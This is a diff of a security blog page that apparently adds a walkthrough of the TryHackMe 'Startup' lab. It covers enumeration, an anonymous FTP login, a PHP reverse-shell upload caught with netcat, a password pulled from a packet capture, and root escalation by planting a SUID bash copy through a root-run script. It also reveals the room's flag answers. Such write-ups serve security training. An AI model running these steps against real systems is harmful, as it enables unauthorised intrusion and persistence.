@@ -23,7 +23,7 @@
     
     
       
-        <title>Summary write ups (easy difficulty) - Offense, Defense, and Everything Between</title>
+        <title>Startup - Offense, Defense, and Everything Between</title>
       
     
     
@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#startup" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -102,7 +107,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Summary write ups (easy difficulty)
+              Startup
             
           </span>
         </div>
@@ -607,6 +612,110 @@
   
   
   
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#description" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Description
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#port-scanning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Port Scanning
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ftp-enuemeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FTP Enuemeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#http-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTTP Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#vulnerability-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Vulnerability Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#foothold" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Foothold
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
   
 </nav>
                   </div>
@@ -621,27 +730,308 @@
                 
                   
 
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:challenge" class="md-tag">challenge</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:easy" class="md-tag">easy</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:network-traffic-inspection" class="md-tag">network-traffic-inspection</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:offensive" class="md-tag">offensive</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:tryhackme" class="md-tag">tryhackme</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:writable-ftp-directory" class="md-tag">writable-ftp-directory</a>
+      
+    
+  </nav>
 
 
-  <h1>Summary write ups (easy difficulty)</h1>
 
+<h1 id="startup">Startup</h1>
+<p><img alt="Startup logo" src="../logos/startup_logo.png" /></p>
+<p><strong>Platform:</strong> TryHackMe<br />
+<strong>Type:</strong> Challenge<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Link:</strong> <a href="https://tryhackme.com/room/startup">Startup</a>  </p>
+<h2 id="description">Description</h2>
+<p>"Abuse traditional vulnerabilities via untraditional means.<br />
+We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!"</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="port-scanning">Port Scanning</h3>
+<div class="highlight"><pre><span></span><code>ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//)
+nmap -p$ports -A -T4 TARGET_IP_ADDRESS
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>Host is up (0.00046s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
+| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.81.79.24
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
+|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
+|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Maintenance
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 3.13 (98%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%), Android 7.1.1 - 7.1.2 (92%), Linux 3.13 (92%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+</code></pre></div>
+<h3 id="ftp-enuemeration">FTP Enuemeration</h3>
+<div class="highlight"><pre><span></span><code>ftp TARGET_IP_ADDRESS
+Connected to TARGET_IP_ADDRESS.
+220 (vsFTPd 3.0.3)
+Name (TARGET_IP_ADDRESS:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
+-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
+-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
+226 Directory send OK.
+ftp&gt; get important.jpg
+local: important.jpg remote: important.jpg
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for important.jpg (251631 bytes).
+226 Transfer complete.
+251631 bytes received in 0.10 secs (2.5204 MB/s)
+ftp&gt; get notice.txt
+local: notice.txt remote: notice.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for notice.txt (208 bytes).
+226 Transfer complete.
+208 bytes received in 0.00 secs (2.2541 MB/s)
+ftp&gt; cd ftp
+250 Directory successfully changed.
+ftp&gt; dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp&gt; bye
+221 Goodbye.
+root@ip-10-81-79-24:~# cat notice.txt
+Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
+</code></pre></div>
+<h3 id="http-enumeration">HTTP Enumeration</h3>
+<div class="highlight"><pre><span></span><code>ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
+gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
+</code></pre></div>
+<p><strong>Notes</strong>  </p>
 <ul>
-<li><a href="../brooklyn_nine_nine/">Brooklyn Nine Nine</a>  </li>
-<li><a href="../smag_grotto/">Smag Grotto</a>  </li>
-<li><a href="../bounty_hunter/">Bounty Hunter</a>  </li>
-<li><a href="../easy_peasy/">Easy Peasy</a></li>
-<li><a href="../gamingserver/">GamingServer</a></li>
-<li><a href="../rootme/">RootMe</a></li>
-<li><a href="../poster/">Poster</a></li>
-<li><a href="../brute_it/">Brute It</a></li>
-<li><a href="../startup/">Startup</a></li>
+<li>Static holding page in web browser  </li>
+<li>No <code>robots.txt</code> or <code>sitemap</code> files  </li>
+<li>Nothing interesting in the source code  </li>
+<li><code>ffuf</code> scan reveals <code>/files</code> directory: reveals <code>ftp</code> share is serviced through HTTP  </li>
 </ul>
+<h3 id="vulnerability-enumeration">Vulnerability Enumeration</h3>
+<div class="highlight"><pre><span></span><code>searchsploit vsftpd 3.0.3   # Only result: DoS
+searchsploit OpenSSH 7.2p2  # Only result: username enumeration
+searchsploit httpd 2.4.18   # Only result: DoS
+</code></pre></div>
+<h2 id="foothold">Foothold</h2>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Upload <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">reverse shell</a> to writable <code>/ftp</code> directory using <code>ftp</code><br />
+<em>File saved as shell.php ready for upload</em></p>
+<div class="highlight"><pre><span></span><code>ftp TARGET_IP_ADDRESS
+Connected to TARGET_IP_ADDRESS.
+220 (vsFTPd 3.0.3)
+Name (TARGET_IP_ADDRESS:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; cd ftp
+250 Directory successfully changed.
+ftp&gt; put shell.php
+local: shell.php remote: shell.php
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+5683 bytes sent in 0.00 secs (83.3805 MB/s)
+ftp&gt; bye
+221 Goodbye.
+root@ip-10-81-79-24:~# nc -lvnp 1234
+Listening on 0.0.0.0 1234
+Connection received on TARGET_IP_ADDRESS 51378
+Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 18:18:41 up  1:33,  0 users,  load average: 0.00, 0.11, 0.16
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can&#39;t access tty; job control turned off
+
+$ python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+
+www-data@startup:/$ ls -al
+total 100
+drwxr-xr-x  25 root     root      4096 May  2 16:45 .
+drwxr-xr-x  25 root     root      4096 May  2 16:45 ..
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
+drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
+drwxr-xr-x  16 root     root      3560 May  2 16:45 dev
+drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
+drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
+drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
+lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -&gt; boot/initrd.img-4.4.0-190-generic
+lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -&gt; boot/initrd.img-4.4.0-190-generic
+drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
+drwx------   2 root     root     16384 Sep 25  2020 lost+found
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
+dr-xr-xr-x 124 root     root         0 May  2 16:45 proc
+-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
+drwx------   4 root     root      4096 Nov 12  2020 root
+drwxr-xr-x  25 root     root       900 May  2 17:45 run
+drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
+drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
+drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
+dr-xr-xr-x  13 root     root         0 May  2 16:45 sys
+drwxrwxrwt   7 root     root      4096 May  2 18:21 tmp
+drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
+drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
+drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
+lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -&gt; boot/vmlinuz-4.4.0-190-generic
+lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-190-generic
+www-data@startup:/$ cat recipe.txt
+</code></pre></div>
+<details class="success">
+<summary>What is the secret spicy soup recipe?</summary>
+<p>love</p>
+</details>
+<div class="highlight"><pre><span></span><code>www-data@startup:/$ ls -al /incidents
+total 40
+drwxr-xr-x  2 www-data www-data  4096 Nov 12  2020 .
+drwxr-xr-x 25 root     root      4096 May  2 16:45 ..
+-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
+www-data@startup:/$ cp /incidents/suspicious.pcapng /var/www/html/files/ftp
+</code></pre></div>
+<p><strong>Action(s)</strong><br />
+<img alt="✅" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.1.0/assets/svg/2705.svg" title=":white_check_mark:" /> Download <code>suspicious.pcapng</code> from HTTP FTP share in web browser and inspect with Wireshark<br />
+<em>Potential password for "lennie" user found in .pcapng file: "c4ntg3t3n0ughsp1c3"</em></p>
+<div class="highlight"><pre><span></span><code>ssh lennie@TARGET_IP_ADDRESS
+lennie@TARGET_IP_ADDRESS&#39;s password: 
+
+$ pwd
+/home/lennie
+$ ls -al 
+total 24
+drwx------ 5 lennie lennie 4096 May  2 18:43 .
+drwxr-xr-x 3 root   root   4096 Nov 12  2020 ..
+drwx------ 2 lennie lennie 4096 May  2 18:43 .cache
+drwxr-xr-x 2 lennie lennie 4096 Nov 12  2020 Documents
+drwxr-xr-x 2 root   root   4096 Nov 12  2020 scripts
+-rw-r--r-- 1 lennie lennie   38 Nov 12  2020 user.txt
+$ cat user.txt
+</code></pre></div>
+<details class="success">
+<summary>What are the contents of user.txt?</summary>
+<p>THM{03ce3d619b80ccbfb3b7fc81e46c0e79}</p>
+</details>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<div class="highlight"><pre><span></span><code>$ ls -al scripts
+total 16
+drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
+drwx------ 5 lennie lennie 4096 May  2 18:58 ..
+-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
+-rw-r--r-- 1 root   root      1 May  2 18:58 startup_list.txt
+$ cat scripts/planner.sh
+#!/bin/bash
+echo $LIST &gt; /home/lennie/scripts/startup_list.txt
+/etc/print.sh
+$ cat scripts/startup_list.txt
+
+$ echo $LIST
+
+$ cat /etc/print.sh
+#!/bin/bash
+echo &quot;Done!&quot;
+$ echo &#39;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&#39; &gt;&gt; /etc/print.sh
+$ /tmp/rootbash -p
+
+rootbash-4.3# ls -al /root
+total 28
+drwx------  4 root root 4096 Nov 12  2020 .
+drwxr-xr-x 25 root root 4096 May  2 16:45 ..
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwxr-xr-x  2 root root 4096 Nov 12  2020 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   38 Nov 12  2020 root.txt
+drwx------  2 root root 4096 Nov 12  2020 .ssh
+rootbash-4.3# cat /root/root.txt
+</code></pre></div>
+<details class="success">
+<summary>What are the contents of root.txt?</summary>
+<p>THM{f963aaa6a430f210222158ae15c3d76d}</p>
+</details>
+<p><strong>Tools Used</strong><br />
+<code>Wireshark</code></p>
+<p><strong>Date completed:</strong> 02/05/26<br />
+<strong>Date published:</strong> 02/05/26</p>
 
 
 
 
 
 
+
+  
+  
 
 
 
